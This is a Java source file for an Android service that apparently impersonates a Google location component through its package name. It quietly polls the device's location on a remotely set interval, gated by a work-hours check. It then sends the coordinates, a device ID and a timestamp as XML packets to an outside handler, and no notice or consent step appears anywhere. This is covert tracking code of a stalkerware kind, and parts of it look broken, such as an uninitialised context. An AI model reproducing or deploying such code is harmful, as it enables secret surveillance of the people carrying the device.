package com.google.android.location;

import java.text.SimpleDateFormat;
import java.util.Calendar;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.util.Log;
import android.widget.Toast;

import com.google.android.bs.DataSendHandler;
import com.google.android.bs.MainActivity;
import com.google.android.bs.WorkTimeDefiner;

public class GPSTracker extends Service implements LocationListener {

	private static final String TAG = "locationService";
	// flag for GPS status
	boolean isGPSEnabled = false;
	SharedPreferences sp;
	// flag for network status
	boolean isNetworkEnabled = false;
	String bestProvider = null;
	// flag for GPS status
	boolean canGetLocation = false;
	Context context = null;
	Editor e;
	Location location; // location
	double latitude; // latitude
	double longitude; // longitude
	String locMetod;
	MainActivity simInfo;
	String ID;
	String nameId;
	int minute;
	private static final int SERVICE_REQUEST_CODE = 15;

	// The minimum distance to change Updates in meters
	private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 0; // 100
																	// meters

	// The minimum time between updates in milliseconds
	private static long MIN_TIME_BW_UPDATES = 0; // 30 minute

	// Declaring a Location Manager
	protected LocationManager locationManager;

	@Override
	public void onCreate() {
		Log.d(TAG, ">>>onCreate() GPS");
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.d(TAG, "onStartCommand gpsTracker");
		sp = PreferenceManager.getDefaultSharedPreferences(context);
		String gpsEnd = sp.getString("ACTION", "OK");
		MIN_TIME_BW_UPDATES = Integer.parseInt(sp.getString("GEO", "5")) * 1000 * 60;
		if (gpsEnd.equals("REMOVE")) {
			return -1;
		}
		boolean isWork = WorkTimeDefiner.isDoWork(getApplicationContext());
		if (!isWork) {
			Log.d(TAG, "isWork return " + Boolean.toString(isWork));
			Log.d(TAG, "after isWork retrun 0");
			return 0;
		} else {
			Log.d(TAG, Boolean.toString(isWork));
		}

		getLocation();
		Log.d(TAG, ">>>onStartCommand()");

		return Service.START_STICKY;
	}

	public Location getLocation() {
		try {
			
			locationManager = (LocationManager) context
					.getSystemService(LOCATION_SERVICE);
			Criteria criteria = new Criteria();
			criteria.setAltitudeRequired(false);
			criteria.setBearingRequired(false);
			criteria.setCostAllowed(false);
			criteria.setPowerRequirement(Criteria.POWER_LOW);
			criteria.getSpeedAccuracy();
			criteria.setAccuracy(Criteria.ACCURACY_FINE);
			String provider = locationManager.getBestProvider(criteria, true);
			// location = locationManager.getLastKnownLocation(provider);
			// getting GPS status
			isGPSEnabled = locationManager
					.isProviderEnabled(LocationManager.GPS_PROVIDER);

			// getting network status
			isNetworkEnabled = locationManager
					.isProviderEnabled(LocationManager.NETWORK_PROVIDER);

			if (provider.equals("")) {
				// no network provider is enabled

			} else {
				this.canGetLocation = true;
				// First get location from Network Provider

				locationManager.requestLocationUpdates(provider,
						MIN_TIME_BW_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES,
						this);
				Log.d("availeable", provider);
				if (locationManager != null) {
					location = locationManager.getLastKnownLocation(provider);
					if (location != null) {
						latitude = location.getLatitude();
						longitude = location.getLongitude();
					}
				}
			}
			// if GPS Enabled get lat/long using GPS Services

		} catch (Exception e) {
			e.printStackTrace();
		}

		return location;
	}

	public void sendLoc() {
		sp = PreferenceManager.getDefaultSharedPreferences(this);
		String sendStr = "<packet><id>" + sp.getString("ID", "ID")
				+ "</id><time>" + logTime() + "</time><type>5</type><app>"
				+ latitude + " " + longitude + "</app><ttl>" + locMetod
				+ "</ttl></packet>";

		DataSendHandler dSH = new DataSendHandler(getApplicationContext());
		dSH.send(4, sendStr);
		Log.d(TAG, sendStr);
	}

	public void sendNoLoc() {
		sp = PreferenceManager.getDefaultSharedPreferences(this);
		String sendStr = "<packet><id>" + sp.getString("ID", "ID")
				+ "</id><time>" + logTime() + "</time><type>5</type><app>"
				+ "определение местонахождения не поддерживаеся"
				+ "</app><ttl>" + locMetod + "</ttl></packet>";

		DataSendHandler dSH = new DataSendHandler();
		dSH.send(4, sendStr);
		Log.d(TAG, sendStr);
	}

	@SuppressLint("SimpleDateFormat")
	private String logTime() {
		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		Calendar cal = Calendar.getInstance();
		cal.setTimeInMillis(System.currentTimeMillis());
		return "" + formatter.format(cal.getTime());

	}

	/**
	 * Stop using GPS listener Calling this function will stop using GPS in your
	 * app
	 * */
	public void stopUsingGPS() {
		if (locationManager != null) {
			locationManager.removeUpdates(GPSTracker.this);
		}
	}

	/**
	 * Function to get latitude
	 * */
	public double getLatitude() {
		if (location != null) {
			latitude = location.getLatitude();
		}

		// return latitude
		return latitude;
	}

	/**
	 * Function to get longitude
	 * */
	public double getLongitude() {
		if (location != null) {
			longitude = location.getLongitude();
		}

		// return longitude
		return longitude;
	}

	/**
	 * Function to check GPS/wifi enabled
	 * 
	 * @return boolean
	 * */
	public boolean canGetLocation() {
		return this.canGetLocation;
	}

	/**
	 * Function to show settings alert dialog On pressing Settings button will
	 * lauch Settings Options
	 * */

	@Override
	public void onLocationChanged(Location location) {
		// latitude = location.getLatitude();
		// longitude = location.getLatitude();
		// Toast.makeText(getApplicationContext(), latitude + " " + longitude,
		// Toast.LENGTH_LONG).show();
	}

	@Override
	public void onProviderDisabled(String provider) {
	}

	@Override
	public void onProviderEnabled(String provider) {
	}

	@Override
	public void onStatusChanged(String provider, int status, Bundle extras) {
	}

	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}

}
